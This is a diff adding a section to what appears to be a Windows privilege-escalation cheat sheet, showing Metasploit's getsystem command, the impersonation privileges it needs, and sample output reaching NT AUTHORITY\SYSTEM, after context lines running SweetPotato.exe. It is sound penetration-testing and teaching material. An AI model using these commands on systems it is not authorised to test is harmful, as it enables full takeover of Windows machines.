@@ -181,3 +181,53 @@ SweetPotato.exe -p cmd.exe
 SweetPotato.exe -p powershell.exe
 ```
 
+---
+
+## Using Metasploit
+
+Metasploit provides the `getsystem` command to automatically escalate privileges to **NT AUTHORITY\SYSTEM** by abusing token impersonation techniques.
+
+#### Requirements
+
+The current user must have at least one of the following privileges:
+
+- SeImpersonatePrivilege
+    
+- SeDebugPrivilege
+    
+
+Check from a shell:
+
+```bash
+meterpreter > shell
+whoami /priv
+```
+
+#### Execution
+
+From an active Meterpreter session:
+
+```bash
+meterpreter > getuid
+meterpreter > getsystem
+```
+
+#### How It Works
+
+`getsystem` attempts multiple techniques, including:
+
+- Named Pipe Impersonation (PrintSpooler variant)
+    
+- Token duplication
+    
+- Other Potato-style impersonation methods
+    
+
+It automatically selects the working vector.
+If successful, a new security context is obtained:
+
+```bash
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
